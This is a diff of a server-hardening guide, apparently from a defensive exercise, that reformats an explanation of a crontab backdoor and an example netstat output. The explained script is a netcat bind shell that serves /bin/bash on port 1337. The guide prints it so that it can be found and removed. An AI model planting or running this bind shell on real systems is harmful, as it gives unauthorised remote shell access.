@@ -104,17 +104,18 @@ In order to find and remove these backdoors from the inside:
             * remove that line from the crontab.
             * make sure it's been removed: `crontab -u rose -l`
         * for fun: explanation of the backdoor:
-            ```
-            It is a script:
+        
+            ```bash
+            ## It is a script:
             #!/bin/bash
             
-            This is the command it uses to check that the script is running:
+            ## This is the command it uses to check that the script is running:
             isOn=`netstat -tln | grep ':1337'|wc -l`
             
-            The if statement checks the result of the isOn command -- if it is zero, then
+            ## The if statement checks the result of the isOn command -- if it is zero, then
             if [ $isOn == "0" ]
             then
-              It starts a netcat command that enables data sent to the 1337 port to give access to bash (the command line)
+              ## It starts a netcat command that enables data sent to the 1337 port to give access to bash (the command line)
               nc -l -p 1337 -e /bin/bash
             fi
             ```
@@ -213,6 +214,7 @@ Remove at least the following services:
 
 
 Once a server is secured, the netstat output should look something like this (although it will be a little different on some servers):
+
 ```
 Active Internet connections (only servers)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
